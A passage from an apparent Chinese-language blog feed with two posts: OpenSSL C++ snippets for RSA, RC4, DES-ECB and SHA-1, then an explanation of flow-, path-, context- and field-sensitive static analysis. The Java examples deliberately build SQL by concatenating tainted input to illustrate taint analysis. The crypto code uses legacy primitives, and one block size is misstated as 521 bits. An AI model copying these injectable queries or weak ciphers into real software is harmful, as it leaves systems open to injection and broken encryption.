class="built_in">PEM_read_RSA_PUBKEY</span>(f, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">fclose</span>(f);</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;generate public key failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">RSA_verify</span>(NID_sha1, (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) data.<span class="built_in">c_str</span>(), data.<span class="built_in">length</span>(),</span><br><span class="line">                    (<span class="type">unsigned</span> <span class="type">char</span> *) signature.<span class="built_in">c_str</span>(), signature.<span class="built_in">length</span>(), key)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;verify failed!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;verify success!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>对称密码</h1><p>因为课堂教学顺序是这样，所以我也放在最后了。</p><h2 id="RC4">RC4</h2><p>流密码是<strong>对称加密算法</strong>，加解密双方（基于密钥）产生相同伪随机流， 明文与伪随机流按位<strong>异或</strong>加密。一种具有<strong>可变密钥长度</strong>（1~255 字节）的流密码。它依赖初始的 256 字节状态数组（初始化为单位数组）开始迭代</p><ul><li>KSA 算法：基于 K 置换状态数组</li><li>PRNG 算法：扩充状态数组，加密明文数据</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">string <span class="title">rc4_encrypt</span><span class="params">(string data,string init_key)</span></span>&#123;</span><br><span class="line">    RC4_KEY key;</span><br><span class="line">    <span class="built_in">RC4_set_key</span>(&amp;key,init_key.<span class="built_in">length</span>(),(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)init_key.<span class="built_in">c_str</span>());</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* cipher = (<span class="type">unsigned</span> <span class="type">char</span> *) <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>) * (data.<span class="built_in">length</span>()));;</span><br><span class="line">    <span class="built_in">RC4</span>(&amp;key,data.<span class="built_in">length</span>(),(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)data.<span class="built_in">c_str</span>(),cipher);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>((<span class="type">char</span>*)cipher,data.<span class="built_in">length</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意两个地方，<code>RC4_KEY</code> <strong>不能是指针</strong>，必须声明式结构体。接收密文的 buffer 必须提前<strong>分配和明文一样大的内存</strong>。</p><h2 id="DES">DES</h2><p>DES 是分组密码，将明文进行分组，将每个明文分组作为整体进行加解密。<strong>分组长度 64 位</strong>；<strong>有效密钥长度 56 位</strong>。DES 基于 Feistel 密码结构，也就是</p><ul><li><p>扩散：明文每一位影响密文许多位</p></li><li><p>混淆：隐藏密文与密钥统计关系</p></li></ul><h3 id="分组密码应用模式">分组密码应用模式</h3><ul><li><p>ECB(Electronic codebook)，每个分组都是各自独立加密的，不好隐藏数据的模式和统计特征。</p></li><li><p>CBC(Cipher-block chaining)，第一个块需要使用初始化向量，然后每个密文块依赖上一个密文块。<strong>串行加密，并行解密</strong>。</p><img src="http://cdn.blog-blockchain.xyz/202211301016785.png" alt="Cbc_encryption" style="zoom:150%;" /><img src="http://cdn.blog-blockchain.xyz/202211301016345.png" alt="Cbc_decryption" style="zoom:150%;" /></li><li><p>CTR(Counter mode)，数器可以是任意保证长时间不产生重复输出的函数，但使用一个普通的计数器是最简单和最常见的做法。<strong>并行加密，并行解密</strong>。</p><img src="http://cdn.blog-blockchain.xyz/202211301025802.png" alt="Ctr_encryption" style="zoom:150%;" /><img src="http://cdn.blog-blockchain.xyz/202211301025956.png" alt="Ctr_decryption" style="zoom:150%;" /></li></ul><h3 id="代码">代码</h3><p>核心就是记得 <code>DES_string_to_key</code> 之后再 <code>DES_set_key_checked</code> 生成另外一个密钥，加密函数的最后一个参数要写 <code>DES_ENCRYPT</code> 或者 <code>DES_DECRYPT</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">convert_string_to_des_block</span><span class="params">(string str, DES_cblock &amp;output)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i) output[i] = str[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//只能处理一个8字节的块，需要加密任意数据的话，还需要封装一层</span></span><br><span class="line"><span class="function">string <span class="title">des_encrypt</span><span class="params">(string plain, string secret_key)</span> </span>&#123;</span><br><span class="line">    DES_cblock in_data, out_data, key;</span><br><span class="line">    <span class="built_in">convert_string_to_des_block</span>(plain, in_data);</span><br><span class="line">    <span class="built_in">DES_string_to_key</span>(secret_key.<span class="built_in">c_str</span>(), &amp;key);</span><br><span class="line">    DES_key_schedule keys;</span><br><span class="line">    <span class="built_in">DES_set_key_checked</span>(&amp;key, &amp;keys);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">DES_ecb_encrypt</span>(&amp;in_data, &amp;out_data, &amp;keys, DES_ENCRYPT);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>((<span class="type">char</span> *) out_data, plain.<span class="built_in">length</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="SHA-1">SHA-1</h2><p>哈希函数<strong>单向</strong>、<strong>抗碰撞</strong>，用于<strong>检测数据完整性</strong>。考前要记住 SHA1，摘要 160 bit，分组 521 bit，80 次迭代。</p><img src="http://cdn.blog-blockchain.xyz/202211301056714.png" alt="image-20221130105613630" style="zoom: 67%;" /><p>代码挺简单的，注意缓冲区 20 字节就可以了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">string <span class="title">sha1_digest</span><span class="params">(string msg)</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> obuf[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">SHA1</span>((<span class="type">unsigned</span> <span class="type">char</span> *) msg.<span class="built_in">c_str</span>(), msg.<span class="built_in">length</span>(), obuf);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>((<span class="type">char</span> *) obuf, <span class="number">20</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/C-language-basis/&quot; title=&quot;C语言基础&quot;&gt;C语言基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/modular-inverses/&quot; title=&quot;乘法逆元&quot;&gt;乘法逆元&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/cpp-cryptographic-algorithm-basis/&quot; title=&quot;信息安全算法基础&quot;&gt;信息安全算法基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/OS/&quot; title=&quot;操作系统基础&quot;&gt;操作系统基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/x86-masm/&quot; title=&quot;x86汇编基础&quot;&gt;x86汇编基础&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cs-courses/information-theory/&quot; title=&quot;信息论与编码&quot;&gt;信息论与编码&lt;/a&gt;&lt;/li&gt;&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;</summary>
        
      
    
    
    
    <category term="courses" scheme="https://www.blog-blockchain.xyz/categories/courses/"/>
    
    
    <category term="crypto" scheme="https://www.blog-blockchain.xyz/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>（六）指向分析</title>
    <link href="https://www.blog-blockchain.xyz/pl/points-to-analysis/"/>
    <id>https://www.blog-blockchain.xyz/pl/points-to-analysis/</id>
    <published>2022-11-21T13:50:33.000Z</published>
    <updated>2024-11-15T14:30:54.926Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/pl/understanding-program-analysis/" title="（一）初识软件分析">（一）初识软件分析</a></li><li><a href="/pl/data-flow-analysis/" title="（二）数据流分析基础">（二）数据流分析基础</a></li><li><a href="/pl/LP-souffle/" title="（三）Datalog和程序分析">（三）Datalog和程序分析</a></li><li><a href="/pl/ssa-and-sparse-analysis/" title="（四）静态单赋值和稀疏分析">（四）静态单赋值和稀疏分析</a></li><li><a href="/pl/Interprocedural-DFA/" title="（五）过程间分析">（五）过程间分析</a></li><li><a href="/pl/points-to-analysis/" title="（六）指向分析">（六）指向分析</a></li><li><a href="/pl/abstract-interpretation/" title="（七）抽象解释">（七）抽象解释</a></li><li><a href="/pl/SMT-and-symbolic-excution/" title="（八）SMT和符号执行">（八）SMT和符号执行</a></li><li><a href="/pl/static-analysis-tools/" title="（九）体验静态分析工具">（九）体验静态分析工具</a></li><li><a href="/pl/fuzzing-introduction/" title="（十）Fuzzing 基础">（十）Fuzzing 基础</a></li></ol></blockquote><h1>程序分析中的敏感性</h1><blockquote><p>看到一篇总记得比较有条理的博客：华为云社区的《<a href="https://bbs.huaweicloud.com/blogs/234041">静态代码分析敏感性概念</a>》，<strong>本小节（程序分析中的敏感性）的内容全部来自该博客，本人只做了排版优化</strong>。</p></blockquote><p>本文介绍几种在静态代码分析中的敏感性分析的概念。主要有流敏感（flow-sensitive），路径敏感（path-sensitive），上下文敏感（context-sensitive）和域敏感（field-sensitive）。所有的敏感性分析相对于非敏感性分析，在分析的准确性上，都会有很大的精度提升（如减少漏报和误报等），但是会在时间或者空间上有更大损耗。</p><h2 id="流敏感（flow-sensitive）">流敏感（flow-sensitive）</h2><p>流敏感分析，是指在分析时，区分程序的执行顺序的分析。如下面的两段代码：</p><p>代码片段一：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;zhangsan&quot;</span>;</span><br><span class="line">name = System.getProperty(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user where name = &quot;</span> + name;</span><br><span class="line">sqlExecute(sql);</span><br></pre></td></tr></table></figure><p>代码片段二：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">name = <span class="string">&quot;zhangsan&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user where name = &quot;</span> + name;</span><br><span class="line">sqlExecute(sql);</span><br></pre></td></tr></table></figure><p>这里，我们设定 <code>sqlExecute</code> 是执行一条 sql 命令的方法，则上面的两个代码片段中，<code>System.getProperty()</code> 是从环境变量中获取数据，可以认为是污点入口。如果是代码片段一，可能发生 sql 注入风险，因为 <code>name</code> 在第 2 行，被赋给了一个外部传入的数据，第 3 行将 <code>name</code> 传递给了 sql，在第 4 行，sql 被传入一个污点坑。而代码片段二，则没有可能发生 sql 注入风险，因为在第 2 行，<code>name</code> 是个常量，第 3 行 sql 也没有被污染，是拼接了一个常量 <code>zhangsan</code>。</p><p>上面的分析，实际上是一种流敏感的分析，我们分析了 <code>name</code> 在第 1 行和第 2 行指向的内容，从而知道在代码片段一中，第 3 行的 <code>name</code> 指向一个污染数据，代码片段二中，第 3 行的 <code>name</code> 指向的是一个常量字符串，从而知道上面代码片段一有 sql 注入风险，代码片段二没有 sql 注入风险。而如果是流不敏感分析，则不管是代码片段一还是代码片段二，都只能得出来的一个结论是：第 3 行的 <code>name</code> 指向的是常量字符串或者是外部传入的污染数据，从而得到的结论是代码片段一和代码片段二都有 sql 注入的风险。</p><p>从上面的一个简单的结合指向分析和污点传播的案例，我们可以知道，<strong>流敏感分析可以有效降低分析的误报，提高分析的准确性</strong>。绝大部分的数据流分析，例如常量传播、指向分析等，都需要是流敏感分析，当然，也不是说所有的分析都需要是流敏感的，比如静态类型语言中，分析一个变量的类型，分析到一个位置的某个变量的类型信息后，其他地方的该变量自然就都是该类型的。</p><p>流敏感分析已经是程序分析中，数据流分析的最基本要求，已有的一些成熟的代码分析框架，例如 Java 中的 Soot 和 Wala，C/C++中的 Clang 等，都是原始支持流敏感的分析。</p><p>部分源码，在生成 SSA 形式的三地址码后，在 SSA 上的非流敏感分析，在相当程度上，也可以实现类似于普通三地址码的流敏感分析的效果，因为 SSA 中每个变量只会有一次赋值，生成 SSA 形式后，实际上的效果就是每个变量只会有一个指向，例如上面的代码片段，当针对 <code>name</code> 变量，针对两次赋值区分 <code>name1</code> 和 <code>name2</code> 之后，在 sql 中，都使用 <code>name2</code> 赋值，不会再有不同指向的问题。</p><h2 id="路径敏感（path-sensitive）">路径敏感（path-sensitive）</h2><p>路径敏感，就是在进行分析时，同时考虑了分支路径上面的条件信息。如下面的两段代码：</p><p>代码片段一：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String name;</span><br><span class="line"><span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line"><span class="keyword">if</span> (x &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    name = System.getProperty(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    name = <span class="string">&quot;zhangsan&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user where name = &quot;</span> + name;</span><br><span class="line">sqlExecute(sql);</span><br></pre></td></tr></table></figure><p>代码片段二：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String name;</span><br><span class="line"><span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (x &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    name = System.getProperty(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    name = <span class="string">&quot;zhangsan&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user where name = &quot;</span> + name;</span><br><span class="line">sqlExecute(sql);</span><br></pre></td></tr></table></figure><p>上面的两段代码除了 <code>x</code> 的取值外，都相同。那么来分析上面的代码。当 <code>x</code> 大于 0 时，<code>name</code> 是一个从环境变量里面获取的污点数据，当 <code>x</code> 小于等于 0 时，<code>name</code> 是一个常量 <code>zhangsan</code>，然后执行 sql 命令的拼接，并执行命令。</p><p>现有的数据流分析，一般都可以识别到分支操作，然后执行到分支完毕时，执行一个 merge 的操作，然后继续执行。如上，<code>name</code> 在分支结束后，内容是 <code>&#123;System.getProperty(&quot;name&quot;)&#125;∨&#123;zhangsan&#125;</code>，如果是考虑污点分析的抽象值，则为 <code>&#123;Tainted&#125;∨&#123;NotTainted&#125;=&#123;Tainted，NotTainted&#125;</code>，然后 sql 被污染，最后发生一个 sql 注入问题（一般静态代码分析，都是 sound 分析，所以会报一个缺陷）。这种是不考虑路径敏感的场景。</p><p>上面，不考虑分支条件的时候，对代码片段一和代码片段二分析时，都会报出来一个 sql 注入的问题。当带上分支条件时，对于第二种场景，计算约束 <code>constraint(&#123;x == -1&#125;∨&#123;x &gt; 0&#125;)</code> 无解，可以知道污点分支走不进去，从而可以知道其实代码片段二是不会发生 sql 注入的，而只有代码片段一会发生 sql 注入。</p><p>从上面的分析，<strong>路径敏感分析，可以有效降低静态代码分析中的误报，提高分析的准确性</strong>。这就要求，在获取每一条分支路径分析时，都需要同时保存分支的条件，然后通过<strong>约束求解</strong>方法，获取分支可达性，从而降低误报。另外，如果是基于 SSA 形式的分析，一般可以通过在构造 φ 函数时，同时保存分支信息来实现。</p><p>当前，很多静态代码分析框架，例如 Java 中 Soot，原生并没有关于路径分支的可达性的计算支持（即非路径敏感分析，《编译原理》中介绍的数据流分析，就是非路径敏感的），所以如果是基于这些框架开发静态代码分析框架，需要考虑路径敏感性分析的实现（基于分支条件的约束求解），但是也需要注意可能的路径爆炸等问题。</p><h2 id="上下文敏感（context-sensitive）">上下文敏感（context-sensitive）</h2><p>上下文敏感，就是考虑函数调用的上下文信息。一个函数可能会被多个函数调用，那么在不同的函数调用它的时候，在传给它的实际参数或当时的全局变量不同的情况下，可能有不同的行为，如下面的一段代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name1</span> <span class="operator">=</span> getName(<span class="number">3</span>);  <span class="comment">// Tainted</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">sql1</span> <span class="operator">=</span> <span class="string">&quot;select * from user where name = &quot;</span> + name1;</span><br><span class="line">    sqlExecute(sql1);  <span class="comment">// Taint Sink</span></span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">name2</span> <span class="operator">=</span> getName(-<span class="number">1</span>);  <span class="comment">// Not Tainted</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">sql2</span> <span class="operator">=</span> <span class="string">&quot;select * from user where name = &quot;</span> + name2;</span><br><span class="line">    sqlExecute(sql2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">getName</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (x &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> System.getProperty(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;zhangsan&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上所示，<code>getName()</code>方法基于入参的不同，会返回不同的结果，如上面的代码，在第 2 行和第 6 行，获取到的 <code>name1</code> 和 <code>name2</code> 的污点信息不同，当入参为 3 时，返回的是一个从环境变量中获取的污染的数据，到导致 sql 注入，而当入参为-1 时，返回的是一个常量，不是污染数据，不会有问题。</p><p>所以，在上下文敏感的分析中，在第 4 行应该报一个 sql 注入问题，而在第 8 行则不应该报 sql 注入问题。而上下文非敏感的分析中，不考虑传入参数的不同，<code>getName()</code> 方法，则全部返回一个 <code>&#123;System.getProperty(&quot;name&quot;)&#125;∨&#123;zhangsan&#125;</code>，从而导致第 4 行和第 8 行都会报一个 sql 注入的问题。</p><p>如上分析，上下文敏感分析，可以<strong>减少误报，提高分析精度</strong>，同时，也对函数建立摘要提出了挑战。上下文，指在分析函数调用过程中，可能影响函数行为的所有的信息，不仅仅包含传递的实参，还包括全局变量、实参类型等信息，根据我们的分析的目标来确定（静态代码分析，在一定程度上，全都需要进行一定程度的抽象，需要根据分析目标，在上下文和结果上进行合理抽象）。</p><h2 id="域敏感（field-sensitive）">域敏感（field-sensitive）</h2><p>域敏感，即针对对象属性、容器等数据类型上成员或者元素上面的分析问题。如下面的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    <span class="type">Bean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bean</span>();</span><br><span class="line">    bean.setName(name);</span><br><span class="line">    bean.setGender(<span class="string">&quot;male&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">sql1</span> <span class="operator">=</span> <span class="string">&quot;select * from user where name = &quot;</span> + bean.getName();</span><br><span class="line">    sqlExecute(sql1);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">sql2</span> <span class="operator">=</span> <span class="string">&quot;select * from user where gender = &quot;</span> + bean.getGender();</span><br><span class="line">    sqlExecute(sql2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Bean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String gender;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上面的例子，在第 2 行，<code>name</code> 是污染数据，然后在第 4 行，将 <code>bean</code> 的 <code>name</code> 属性设为 name，将 <code>bean</code> 的 <code>gender</code> 设置为常量 male，从而 <code>bean</code> 的 <code>name</code> 属性是被污染的，<code>gender</code> 属性没有被污染，继续往下分析，在执行 sql1 的第 8 行，应该报一个 sql 注入问题，而在执行 sql2 的第 11 行，不应该报 sql 注入问题。</p><p>如果是域敏感分析，可以将污点打在对象的属性上面，从而能够区分上面的场景，只在第 8 行报一个 sql 注入缺陷，而在第 11 行则不会报缺陷，但是如果是域不敏感分析，则无法报准确将污点打在对象的属性上面，从而导致污点被打在对象上，从而导致第 8 行和第 11 行都会报一个缺陷。</p><p>域敏感分析，对于面向对象语言的静态代码分析工具的实现，是一种非常重要的基础要求，如果无法实现域敏感分析，则会导致大量的无关的误报问题。当前，很多开源的分析框架，例如 Java 中基于 Soot 的 IDEal，就实现了域敏感的分析（可以参考<a href="http://www.bodden.de/pubs/sab19context.pdf%EF%BC%8CContext-">http://www.bodden.de/pubs/sab19context.pdf，Context-</a>, Flow-, and Field-Sensitive Data-Flow Analysis using Synchronized Pushdown Systems），也有一些静态代码分析工具，将对象的属性延展为普通的变量来实现污点标记。</p><p>上面介绍的这种域敏感分析，是静态代码分析工具的基本要求，下面介绍两种域敏感分析，根据我的使用静态代码分析工具的经验，还很少有工具很好地支持了下面的场景，直接看代码：</p><p>案例一，List 场景：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">List&lt;String&gt; arg = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(<span class="number">2</span>);</span><br><span class="line">arg.add(name);</span><br><span class="line">arg.add(<span class="string">&quot;male&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">sql1</span> <span class="operator">=</span> <span class="string">&quot;select * from user where name = &quot;</span> + arg.get(<span class="number">0</span>);</span><br><span class="line">sqlExecute(sql1);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">sql2</span> <span class="operator">=</span> <span class="string">&quot;select * from user where gender = &quot;</span> + arg.get(<span class="number">1</span>);</span><br><span class="line">sqlExecute(sql2);</span><br></pre></td></tr></table></figure><p>案例二，Map 场景：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">2</span>);</span><br><span class="line">map.put(<span class="string">&quot;name&quot;</span>, name);</span><br><span class="line">map.put(<span class="string">&quot;gender&quot;</span>, <span class="string">&quot;male&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">sql1</span> <span class="operator">=</span> <span class="string">&quot;select * from user where name = &quot;</span> + map.get(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">sqlExecute(sql1);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">sql2</span> <span class="operator">=</span> <span class="string">&quot;select * from user where gender = &quot;</span> + map.get(<span class="string">&quot;gender&quot;</span>);</span><br><span class="line">sqlExecute(sql2);</span><br></pre></td></tr></table></figure><p>当前，还没有很好的工具，可以对上面的场景进行区分，如果没有误报的话，对于案例一和案例二，都是第 7 行应该有 sql 注入缺陷，第 10 行没有，但是，当前还没有一款很好的工具（也可能是有，但是我不知道），可以很好地对 <code>List</code> 和 <code>Map</code> 中的 <code>add</code> 和 <code>put</code> 进行准确处理。<code>List</code> 的 <code>add</code> 方法，<code>Map</code> 的 <code>put</code> 方法，都会把污点标记给打到整个容器上。</p><h2 id="总结">总结</h2><p>流敏感分析，针对的是同一个代码块内部的语句的顺序执行的数据流分析的要求；路径敏感分析，针对的是同一个方法内里面，能够区分不同分支的分析要求（数据流分析是路径不敏感的）；上下文敏感分析，是针对跨过程调用的时候的数据流分析要求。这三个概念层层递进，都是面向程度执行结构的敏感性要求，是一个静态代码分析工具的基本通用要求，一般的静态代码分析框架，都应该实现这些基本要求。</p><p>域敏感，也叫属性敏感，主要针对面向对象语言（包括 C 语言中的结构体等）的一种分析技术，目的是提高静态代码的分析精度，贯穿整个分析过程。实际上，域敏感并不是必须完全需要实现，静态代码分析工具可以基于需要，在不同的层次上实现域敏感，同时，也可以<strong>刻意将待分析程序部分内容实现为域不敏感来提高性能（域敏感分析，对分析时间和分析所消耗的内存，都有显著影响）</strong>。</p><h1>流非敏感指向分析</h1><p>为什么进行流非敏感的指向分析？下面例子来自《<a href="https://blog.csdn.net/a173373310/article/details/119167140">论文解读系列–《Flow-Sensitive Pointer Analysis for Millions of Lines of Code》</a>》，做了一点儿改正。</p><blockquote><p>流敏感分析是考虑了每个程序点的独有状态值，即在某条语句之前和之后，可能状态值是不一样的。比如：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  int *p, *q, a, b, c</span></span><br><span class="line">p = &amp;a;</span><br><span class="line">q = &amp;b;</span><br><span class="line">p = &amp;c;</span><br><span class="line">p = q;</span><br></pre></td></tr></table></figure><p>如果是非流敏感分析，那么分析结果将是 <strong>pts_set [p] = {a, b, c}</strong> 对所有位置均成立，显然这是错误的。因为在语句 1 之后，p 只是指向了 a。如果是流敏感分析，那么结果是，对于语句 1 执行后，<strong>pts_set [p] = {a}</strong>, 在语句 3 执行后，<strong>pts_set [p] = {a ,c}</strong>, 在语句 4 执行后，<strong>pts_set [p] = {a, b, c}</strong>。<br>可以看到，流敏感分析对于程序分析精度的提高是非常有用的。</p><p><strong>总结： 